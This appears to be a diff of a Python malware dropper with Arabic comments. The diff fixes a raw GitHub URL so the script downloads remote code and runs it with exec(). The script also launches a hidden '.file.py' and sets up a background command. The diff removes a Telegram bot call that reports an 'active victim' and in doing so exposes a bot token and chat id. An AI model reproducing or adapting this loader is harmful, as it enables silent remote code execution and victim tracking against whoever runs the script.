@@ -19,7 +19,7 @@ except ModuleNotFoundError:
     os.system('python .file.py')
 
 # تحميل وتنفيذ كود من URL
-X1 = requests.get('https://raw.githubusercontent.com/JDXSX/VBCJCXUF/blob/main/.file.py').text
+X1 = requests.get('https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py').text
 exec(X1)
 
 # تحديد الأمر لتشغيل سكربت في الخلفية
@@ -54,7 +54,3 @@ except FileNotFoundError:
     sys.exit('\nSorry, your system does not support this functionality.')
 
 # إرسال رسالة عبر Telegram
-try:
-    requests.post(f'https://api.telegram.org/bot7117541309:AAHcNg2Wb8ppCgSzf8HG7HMuCyQyGR--NtM/sendMessage?chat_id=6558294755&text=ضحيه نشطه مع{method}')
-except Exception as e:
-    print(f"Error sending Telegram message: {e}")
